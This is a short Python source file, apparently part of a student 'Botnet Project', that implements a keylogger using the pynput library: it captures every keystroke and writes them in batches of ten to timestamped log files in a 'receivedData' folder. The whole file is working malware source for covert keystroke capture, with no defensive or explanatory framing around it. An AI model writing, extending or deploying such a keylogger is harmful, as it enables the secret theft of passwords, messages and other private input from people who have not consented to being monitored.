import os
from pynput import keyboard
import datetime

def get_key_name(key):
    if isinstance(key, keyboard.KeyCode):
        return key.char
    else:
        return str(key)

count = 0
keys = []

def on_press(key):
    global keys, count
    key_name = get_key_name(key)
    keys.append(key_name)
    count += 1
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    filename = f"keylogs_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
    with open(os.path.join(r"D:\Air University\Botnet Project\static\receivedData\keylogs", filename), "a") as f:
        for key in keys:
            if key is not None:
                f.write(str(key) + " ")

def on_release(key):
    pass

def startKeylogger():
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    startKeylogger()
